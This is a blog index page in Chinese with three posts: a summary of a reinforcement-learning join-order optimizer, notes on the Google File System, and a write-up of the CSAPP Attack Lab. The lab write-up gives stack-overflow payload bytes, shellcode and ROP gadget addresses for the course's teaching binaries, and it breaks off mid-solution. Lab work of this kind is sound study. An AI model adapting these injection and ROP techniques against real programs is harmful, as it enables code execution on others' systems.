<!doctype html>
<html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Iggie Wang&#039;s Cyberspace</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Iggie Wang&#039;s Cyberspace"><meta name="msapplication-TileImage" content="/img/dog.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Iggie Wang&#039;s Cyberspace"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Iggie Wang&#039;s Cyberspace"><meta property="og:url" content="https://www.iggiewang.cn/"><meta property="og:site_name" content="Iggie Wang&#039;s Cyberspace"><meta property="og:image" content="https://www.iggiewang.cn/img/og_image.png"><meta property="article:author" content="王亮"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.iggiewang.cn"},"headline":"Iggie Wang's Cyberspace","image":["https://www.iggiewang.cn/img/og_image.png"],"author":{"@type":"Person","name":"王亮"},"publisher":{"@type":"Organization","name":"Iggie Wang's Cyberspace","logo":{"@type":"ImageObject","url":null}},"description":""}</script><link rel="icon" href="/img/dog.jpg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Iggie Wang&#039;s Cyberspace</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item search" title="Suche" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Gepostet vor&nbsp;<time dateTime="2021-02-07T04:30:57.000Z" title="2021/2/7 下午12:30:57">2021-02-07</time></span><span class="level-item">13 minutes lesen (Über 1885 Wörter)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/">Learning to Optimize Join Queries With Deep Reinforcement Learning</a></h1><div class="content"><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>传统的多表 join 算法采用的是动态规划：</p>
<ol>
<li>从初始 query graph 开始</li>
<li>找到 cost 最少的 join</li>
<li>更新 query graph 直到只剩下一个节点。但这种贪心策略并不会保证一定会选到合适的 join order，因为它只直观表示了每个 join 的<code>短期cost</code>。例如：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/1.png" style="zoom:100%;">

<p>动态规划的结果 cost 为 140，而最优解的 cost 为 110。</p>
<p><a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1808.03196.pdf">Learning to Optimize Join Queries With Deep Reinforcement Learning</a> 论文中将 join 问题表示为马尔可夫决策过程（MDP），然后构建了一个使用深度 Q 网络（DQN）的优化器，用来有效地优化 join 顺序。</p>
<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><p>将连接排序表示为 MDP：</p>
<ul>
<li>状态G：a query graph</li>
<li>动作c：a join</li>
<li>下一个状态G’：join后的query graph</li>
<li>奖励J(c)：join的估算成本</li>
</ul>
<p>用 Q-Learning 算法来解决 join 顺序 MDP。在 Q-Learning 中最关键的是得到 Q 函数 Q(G,c)，它可以知道当前 query graph 中进行每个 join 的<code>长期cost</code>。如果我们可以访问真正的 Q(G,c)，就可以对传统的动态规划进行改进：</p>
<ol>
<li>从初始 query graph 开始</li>
<li>找到 Q(G,c) 值最小的 join</li>
<li>更新 query graph 直到只剩下一个节点，从而得到最优的 join order。实际上我们无法访问真正的 Q 函数，因此，我们需要训练一个神经网络，它接收 (G,c) 作为输入，并输出估算的 Q(G,c)。在论文中算法如下，给定query：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/2.png" style="zoom:100%;">

<h4 id="状态-G-和动作-c-的特征化"><a href="#状态-G-和动作-c-的特征化" class="headerlink" title="状态 G 和动作 c 的特征化"></a>状态 G 和动作 c 的特征化</h4><ol>
<li>query graph 中的每个关系的所有属性放入集合 A-G 中；join 左侧的所有属性放入集合 A-L 中；join 右侧的所有属性放入集合 A-R 中。并使用 1-hot 向量来编码。对于该例子，论文中表示如下：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/3.png" style="zoom:100%;">

<ol start="2">
<li>对于查询中的每个选择，我们可以获得 selectivity ∈ [0,1]（用来估计选择后存在的元组占选择前总元组的比例），我们需要根据 selectivity 的值去更新向量。例如：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/4.png" style="zoom:100%;">

<ol start="3">
<li>还可以根据在物理计划中选择的具体 join 算法去产生新的 1-hot 向量（例如，IndexJoin 为 [1 0], HashJoin 为 [0 1]）,与原向量进行串联，如下：</li>
</ol>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/5.png" style="zoom:100%;">

<p>根据在论文 2.5 节的假设：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/6.png" style="zoom:100%;">

<p>在这里我们就可以知道 query graph 特征 fG 为 fG = AG，join 决策特征 fc 为 fc = A-L ⊕ A-R，对于一个特定的元组（G,c）特征化为 fG ⊕ fc。</p>
<h4 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h4><p>DQ 使用多层感知机（MLP）神经网络来表示 Q 函数。它以（G,c）的最终特征化 fG ⊕ fc 作为输入。在实验中发现，两层的 MLP 可以提供最佳表现。模型使用随机梯度下降算法进行训练。</p>
<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>训练后，在原有基础上再对多表 join 算法进行改进：</p>
<ol>
<li>从初始 query graph 开始</li>
<li>使每个 join 特征化</li>
<li>找到模型估计的 Q 值最小的 join（即神经网络的输出）</li>
<li>更新 query graph 直到只剩下一个节点，从而得到最优的 join order。在执行过程中，还可以对 DQ 进行进一步微调。</li>
</ol>
<h2 id="Experiment-Result"><a href="#Experiment-Result" class="headerlink" title="Experiment Result"></a>Experiment Result</h2><p>论文中使用了 Join Order Benchmark（JOB） 来评估 DQ。这个数据库由来自 IMDB 的 21 个表组成，并提供了 33 个查询模板和 113 个查询。查询中的连接关系大小范围为 5 到 15 个。当连接关系的数量不超过 10 个时，DQ 从穷举中收集训练数据。</p>
<p>将 DQ 与几个启发式优化器（QuickPick 和 KBZ）以及经典动态规划（left-deep、right-deep、zig-zag）进行比较。对每个优化器生成的计划进行评分，并与最优计划（通过穷举获得）进行比较。<br>此外，论文中设计了 3 个成本模型：</p>
<ol>
<li>Cost Model 1（Index Mostly）：模拟内存数据库并鼓励使用索引连接</li>
<li>Cost Model 2（Hybrid Hash）：仅考虑具有内存预算的散列连接和嵌套循环连接</li>
<li>Cost Model 3（Hash Reuse）：考虑重用已构建的散列表</li>
</ol>
<p>进行了 4 轮交叉验证后，确保仅对未出现在训练工作负载中的查询进行 DQ 评估（对于每种情况，论文中在 80 个查询上训练并测试其中的 33 个）。计算查询的平均次优性，即“成本（算法计划）/ 成本（最佳计划）”，这个数字越低越好。例如，对 Const Model 1，DQ 平均距离最佳计划 1.32 倍。结果如下：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/7.png" style="zoom:100%;">

<p>在所有成本模型中，DQ 在没有指数结构的先验知识的前提下可以与最优解决方案一比高下。对于固定的动态规划，情况并非如此：例如，left-deep 在 CM1 中产生了良好的计划，但在 CM2 和 CM3 中效果没有那么好。同样，right-deep在 CM1 中没有竞争力，但如果使用 CM2 或 CM3，right-deep 不是最差的。需要注意的是，基于学习的优化器比手动设计的算法更强大，可以适应工作负载、数据或成本模型的变化。</p>
<p>此外，DQ 以比传统动态规划快得多的速度产生了良好的计划：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/8.png" style="zoom:100%;">

<p>对于最大的连接（15），DQ 的速度是穷举的 10000 倍，比 zig-zag 快 1000 倍，比 left-deep 和 right-deep 快 10 倍。</p>
<h2 id="Future-work"><a href="#Future-work" class="headerlink" title="Future work"></a>Future work</h2><p><strong>本文研究中存在的不足：</strong></p>
<ol>
<li>奖励值（即J(c)）依赖于数据库系统的代价模型，当代价估计错误时，算法的 join 计划无法达到最优</li>
<li>需要大量的 query 进行训练，估计的 Q 函数的值才能趋向稳定</li>
</ol>
<p><strong>可以拓展的思路：</strong><br>同样使用强化学习，参考于 <a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1901.05152.pdf">SkinnerDB: Regret-Bounded Query Evaluation via Reinforcement Learning</a>，一条 join query 的执行框架如下：</p>
<img src="/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/9.png" style="zoom:100%;">

<p>查询时，Pre-Processor 首先通过一元谓词过滤基表，接着由 Join Processor 生成查询的连接顺序与执行结果，最后调用 Post-Processor 对结果进行分组、聚合与排序等操作。</p>
<p>Join Processor 包括 4 部分，Join Processor 将每个连接操作分为多个时间片，每个时间片首先由 Learning Optimizer 选择连接顺序，选中的连接顺序由特定的 Join Executor 执行，每次执行固定时长，并将执行结果加入结果集中。Progress Tracker 跟踪被处理的数据，最后由 Reward Calcultor 计算连接顺序的得分。当所有数据被连接后，完成连接操作。学习优化器使用强化学习领域的上限置信区间算法（UCT），在每个时间片中根据连接顺序的枚举空间生成搜索树，并选择一条路径。UCT 算法的特点即不依赖任何具体示例的参数设置，能够适用于较大的搜索空间。</p>
<p>该算法不需要任何查询上下文及 Cardinality 估计模型。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Gepostet vor&nbsp;<time dateTime="2021-01-30T07:26:08.000Z" title="2021/1/30 下午3:26:08">2021-01-30</time></span><span class="level-item">12 minutes lesen (Über 1868 Wörter)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/30/Google-File-System/">Google File System</a></h1><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>GFS 是 Google 针对大数据处理场景设计的分布式文件系统，Google 对数据量的持续增长的设想如下：</p>
<ul>
<li>需要能够运行在经常故障的物理机环境上。只有做到这点，这个系统才能运行在几百到上千台规模下，并采用相对便宜的服务器硬件</li>
<li>大文件居多。存储在 GFS 上的文件的不少都在几个 GB 这样的级别</li>
<li>大多数写是append写，即在文件末尾追加</li>
<li>性能主要考量是吞吐而不是延时</li>
</ul>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>GFS 以目录树的形式组织文件，但是并没有提供类似 POSIX 标准的文件系统操作。操作只要包含 create, open, write, read, close, delete, append, snapshot，其中 snapshot 用于快速复制一个文件或者目录，允许多个客户端并行追加数据到一个文件。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>整体架构上，GFS 由单一的 master 节点、chunkserver 和提供给用户的 client 三大部分组成：</p>
<img src="/2021/01/30/Google-File-System/gfs.png" style="zoom:100%;">

<p>client 与 chunkserver 都不会缓存文件数据，为的是防止数据出现不一致的状况，但是 client 会缓存 metadata 的信息。</p>
<h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p>一方面存储所有的 metadata，负责管理所有的元信息，包括表示文件系统目录结构的 namespace、访问控制信息、文件与 chunk 的映射关系、chunk 的位置信息；另一方面管理 chunk 租约、chunk 迁移(如果 chunkserver 挂掉)、维护与 chunkserver 之间的心跳。</p>
<ul>
<li>namespace 采用全内存的数据结构，以提高访问的吞吐</li>
<li>namespace 是一个查找表(lookup table)，并且采用了前缀压缩的方式存储在内存中，它是一个树结构，树中每一个节点(文件名或目录名)都有一个读/写锁。在对文件或目录操作的时候需要获取锁，例如修改 <code>/root/foo/bar</code>，需要获得 <code>/root</code>、<code>/root/foo</code> 的读锁，<code>/root/foo/bar</code> 的写锁</li>
<li>master 本身并不记录 chunk 的位置，而是在启动的时候，通过收取 chunkserver 的信息来构建。这种设计避免了 master 和 chunkserver 的信息不一致的问题(因为以 chunkserver 为准)</li>
<li>master 和 chunkserver 通过定期心跳来保持信息同步、感知 chunkserver 故障等</li>
<li>master 往磁盘上写操作日志，并将这些日志同步到其他物理机保存的方式来确保数据安全性。当前 master 机器故障的时候，可以通过这些日志和 chunkserver 的心跳内容，可以恢复到故障前的状态</li>
<li>对于操作日志，会定期在系统后台执行 checkpoint；checkpoint 构建成一个类似B+树、可以快速的 load 到内存中直接使用的结构</li>
<li>master 需要定期检查每个 chunk 的副本情况，如果副本低于配置值，就需要将通知 chunkserver 进行复制；如果存在一些多余的 chunk (file 已经被删除了)，就需要做一些清理工作</li>
</ul>
<h3 id="chunkserver"><a href="#chunkserver" class="headerlink" title="chunkserver"></a>chunkserver</h3><p>每个 chunk 有一个 64 位标识符(chunk handle)，它是在 chunk 被创建时由 master 分配的，每一个 chunk 会有多个副本，分别在不同的机器上，每个副本会以 Linux 文件的形式存储在 chunkserver 的本地磁盘上。<br>GFS 中将 chunk 的大小定为 64 MB，它比一般的文件系统的块大小要大。优点：减少 metadata 的数量、减少 client 与 master 的交互、client 可以在一个 chunk 上执行更多的操作，通过 TCP 长连接减少网络压力；缺点：如果在一个 chunk 上有一个可执行文件，同时有许多 client 都要请求执行这个文件，它的压力会很大。<br>chunk 的位置信息在 master 中不是一成不变的，master 会通过定期的 heartbeat 进行更新，这样做能够减小开销，这样做就不用 master 与 chunkserver 时刻保持同步通信(包括 chunkserver 的加入、退出、改名、宕机、重启等)。chunkserver 上有一个 final word，它表示了哪个 chunk 在它的磁盘上，哪个 chunk 不在。</p>
<h2 id="一致性模型"><a href="#一致性模型" class="headerlink" title="一致性模型"></a>一致性模型</h2><img src="/2021/01/30/Google-File-System/consistency.png" style="zoom:100%;">

<blockquote>
<p>defined：状态已定义，从客户端角度来看，客户端完全了解已写入集群的数据<br>consistent：客户端来看chunk多副本的数据完全一致，但不一定defined</p>
</blockquote>
<ul>
<li>串行写：客户端自己知道写入文件范围以及写入数据内容，且本次写入在数据服务器的多副本上均执行成功，每个客户端的写操作串行执行，因此最终结果是 <code>defined</code></li>
<li>并行写：每次写入在数据服务器的多副本上均执行成功，所以结果是 <code>consistent</code>，但客户端无法得知写操作的执行顺序，即使每次操作都成功，客户端无法确定在并发写入时交叉部分，所以是 <code>undefined</code></li>
<li>追加写：客户端能够根据 offset 确切知道写入结果，无论是串行追加还是并发追加，其行为是 <code>defined</code>，追加时至少保证一次副本写成功，如果存在追加失败，则多个副本之间某个范围的数据可能不一致，因此是 <code>interspersed with inconsistent</code>。</li>
</ul>
<h2 id="GFS-租约"><a href="#GFS-租约" class="headerlink" title="GFS 租约"></a>GFS 租约</h2><p>GFS 使用租约机制 (lease) 来保障 mutation (指的是改变了 chunk 的内容或者 metadata，每一次 mutation 都应该作用于所有的备份) 的一致性：多个备份中的一个持有 lease，这个备份被称为 primary replica (其余的备份为 secondary replicas)，GFS 会把所有的 mutation 都序列化(串行化)，让 primary 执行，secondary 也按相同顺序执行，primary 是由 master 选出来的，一个 lease 通常 60 秒会超时。</p>
<h2 id="写流程"><a href="#写流程" class="headerlink" title="写流程"></a>写流程</h2><img src="/2021/01/30/Google-File-System/write.png" style="zoom:100%;">

<ol>
<li>client 向 master 请求持有 lease 的 chunk (primary replica) 位置和其他 replicas 的位置(如果没有 chunk 持有 lease，那么 master 会授予其中一个 replica 一个 lease)</li>
<li>master 返回 primary 的信息和其他 replicas 的位置，然后 client 将这些信息缓存起来(只有当 primary 无法通信或者该 primary replica 没有 lease 了，client 才会向 master 再次请求)</li>
<li>client 会将数据发送到所有的 replicas，每个 chunkserver 会把数据存在 LRU 缓存中</li>
<li>在所有的 replicas 都收到了数据之后，client 会向 primary 发送写请求。primary 会给它所收到的所有 mutation 分配序列号(这些 mutation 有可能不是来自于同一个 client)，它会在自己的机器上按序列号进行操作</li>
<li>primary 给 secondaries 发送写请求，secondaries 会按相同的序列执行操作</li>
<li>secondaries 告知 primary 操作执行完毕</li>
<li>primary 向 client 应答，期间的错误也会发送给 client，client 错误处理程序 (error handler) 会重试失败的 mutation</li>
</ol>
<h2 id="读流程"><a href="#读流程" class="headerlink" title="读流程"></a>读流程</h2><ol>
<li><p>client 向 master 发出 A 文件的读请求</p>
</li>
<li><p>master 收到后返回 A 文件的 chunk handler 和 chunk 的位置</p>
</li>
<li><p>client 携带 chunk handle 以及位偏移向对应的 chunkserver 发出请求</p>
</li>
<li><p>chunkserver 读取并返回数据至 client</p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Ghemawat, Sanjay, Howard Gobioff, and Shun-Tak Leung. “The Google file system.” (2003).</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Gepostet vor&nbsp;<time dateTime="2021-01-21T07:00:00.000Z" title="2021/1/21 下午3:00:00">2021-01-21</time></span><span class="level-item">10 minutes lesen (Über 1528 Wörter)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/21/Attack-Lab/">Attack Lab</a></h1><div class="content"><p><code>本文记录 CSAPP 的 Attack Lab 完成方案。</code></p>
<h2 id="1-ctarget-部分"><a href="#1-ctarget-部分" class="headerlink" title="1. ctarget 部分"></a>1. ctarget 部分</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>level 1</code> 要求我们在 <code>getbuf</code> 输入字符串后，利用溢出来重写栈中 <code>getbuf</code> 函数返回的地址，让函数调用 <code>touch1</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401713 &lt;getbuf&gt;:</span><br><span class="line">  401713:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  401717:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  40171a:	e8 3b 02 00 00       	callq  40195a &lt;Gets&gt;</span><br><span class="line">  40171f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401724:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  401728:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>根据这段汇编代码我们可以确定，<code>getbuf</code> 在栈中分配了0x38比特的内存来存储输入的字符串。如果我们输入的字符串长度超过 56，就可以覆盖掉 <code>getbuf</code> 的返回地址了，所以，我们只需要把输入的第 56-63 个字符填写为 <code>touch1</code> 函数的地址就行了。<br>需要注意的是，我们输入的字符应该用两位十六进制数来表示，然后通过 <code>hex2raw</code> 来将其转换成字符串。另外，我这里数据都是用小端法来保存的，所以低位在前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">29 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p><code>level 2</code> 要求我们注入我们自己写的代码，并把程序转移到我们写的代码处运行，也就是执行 <code>touch2</code>。<br>如何通过我们的代码跳转到 <code>touch2</code> 函数？<br>首先，我们需要找到缓冲区的起始地址，在 <code>getbuf</code> 处打断点，查看 <code>$rsp</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p $rsp</span><br><span class="line">$1 &#x3D; (void *) 0x5565fd40</span><br></pre></td></tr></table></figure>
<p>可以知道，<code>0x5565fd40 - 0x38 = 0x5565fd08</code> 就是缓冲区的起始地址，我们需要和前面的 <code>level 1</code> 一样，让缓冲区溢出，56-63 个字符填写为缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码，这样程序才能执行我们想要的结果。<br>我们注入的代码逻辑应该是：</p>
<ul>
<li>将 <code>cookie</code> 值赋给 <code>%edi</code> 作为 <code>touch2</code> 函数的参数</li>
<li>将 <code>touch2</code> 函数的地址入栈</li>
<li>ret，让函数执行 <code>touch2</code></li>
</ul>
<p>转为汇编就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x2a2e4a08, %edi</span><br><span class="line">pushq $0x0000000000401755</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这里需要用到 <code>gcc</code> 内联汇编的方法，编写 <code>level2.c</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	asm</span><br><span class="line">	(</span><br><span class="line">	 &quot;movl $0x2a2e4a08, %edi\n\t&quot;</span><br><span class="line">	 &quot;pushq $0x0000000000401755\n\t&quot;</span><br><span class="line">	 &quot;ret&quot;</span><br><span class="line">	);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译并查看其反汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc level2.c -o level2.out</span><br><span class="line">objdump -d level2.out </span><br></pre></td></tr></table></figure>
<p>可以看到我们想要的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4004f1:       bf 08 4a 2e 2a          mov    $0x2a2e4a08,%edi</span><br><span class="line">4004f6:       68 55 17 40 00          pushq  $0x401755</span><br><span class="line">4004fb:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>那么我们在缓冲区注入字符就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bf 08 4a 2e 2a 68 55 17 </span><br><span class="line">40 00 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">08 fd 65 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><code>level 3</code> 要求我们执行 <code>touch3</code>，<code>touch3</code> 接收的参数是 <code>cookie</code> 的字符串的地址。<br>有了 <code>level 2</code> 的经验，我们知道需要在 56-63 个字符填写缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码。我们把 <code>cookie</code> 字符串放在第 64-71 个字符，这样，我们注入的代码就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5565fd48, %edi</span><br><span class="line">pushq $0x0000000000401829</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>0x5565fd08 + 64 = 0x5565fd48</code> 是 <code>cookie</code> 字符串的地址，<code>0x0000000000401829</code> 是 <code>touch3</code> 函数地址。同样地，用 <code>gcc</code> 内联汇编的方法得到汇编代码，最终我们在缓冲区注入字符就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bf 48 fd 65 55 68 29 18 </span><br><span class="line">40 00 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">08 fd 65 55 00 00 00 00</span><br><span class="line">32 61 32 65 34 61 30 38</span><br></pre></td></tr></table></figure>

<h2 id="2-rtarget-部分"><a href="#2-rtarget-部分" class="headerlink" title="2. rtarget 部分"></a>2. rtarget 部分</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>与之前的 <code>level 2</code> 相同，我们需要为 <code>%rdi</code> 赋上 <code>cookie</code> 值，再跳转到 <code>touch2</code> 函数执行，跳转到 <code>touch2</code> 只需要将 <code>touch2</code> 的入口地址放在最后一个 <code>gadget</code> 之后，在它的 <code>ret</code> 指令执行之后就会返回到 <code>touch2</code> 中。<br>查看 <code>farm.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000000000001b &lt;getval_188&gt;:</span><br><span class="line">  1b:	b8 3c cd 58 c3       	mov    $0xc358cd3c,%eax</span><br><span class="line">  20:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p><code>58 c3</code> 对应 <code>popq %rax</code>，这条指令的地址是 <code>0x1b + 3 = 0x1e</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000028 &lt;setval_279&gt;:</span><br><span class="line">  28:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)</span><br><span class="line">  2e:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>48 89 c7 c3</code> 对应 <code>movq %rax,%rdi</code>，这条指令的地址是 <code>0x28 + 2 = 0x30</code>。<br>再查看 <code>rtarget.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004018b1 &lt;start_farm&gt;:</span><br><span class="line">  4018b1:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4018b6:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>start_farm</code> 的起始地址是 <code>0x4018b1</code>。所以 <code>popq %rax</code> 这条指令最终的地址是 <code>0x1e + 0x4018b1 = 0x4018cf</code>；所以 <code>movq %rax,%rdi</code> 这条指令最终的地址是 <code>0x30 + 0x4018b1 = 0x4018e1</code>。<br><code>level 2(rtarget)</code> 最终结果为：</p>
